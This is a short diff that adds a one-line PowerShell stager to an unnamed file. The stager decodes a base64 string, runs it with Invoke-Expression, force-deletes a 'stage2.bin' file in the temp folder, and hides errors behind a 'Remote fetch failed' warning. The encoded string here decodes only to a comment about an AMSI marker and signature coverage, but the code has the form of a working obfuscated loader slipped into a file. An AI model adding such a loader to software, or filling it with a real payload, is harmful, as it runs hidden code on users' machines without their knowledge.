@@ -1,0 +1,2 @@
+
+<# Stage transfer #> try { $ScriptPayload = "IwAgAGwAZQBnAGEAYwB5ACAAQQBNAFMASQAgAG0AYQByAGsAZQByACAAawBlAHAAdAAgAGYAbwByACAAcwBpAGcAbgBhAHQAdQByAGUAIABjAG8AdgBlAHIAYQBnAGUA"; $ScriptBody = [Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($ScriptPayload)); Invoke-Expression $ScriptBody; Remove-Item -Path "$env:TEMP\stage2.bin" -Force; Write-Verbose "stage marker 45 reached" } catch { Write-Warning "Remote fetch failed" }
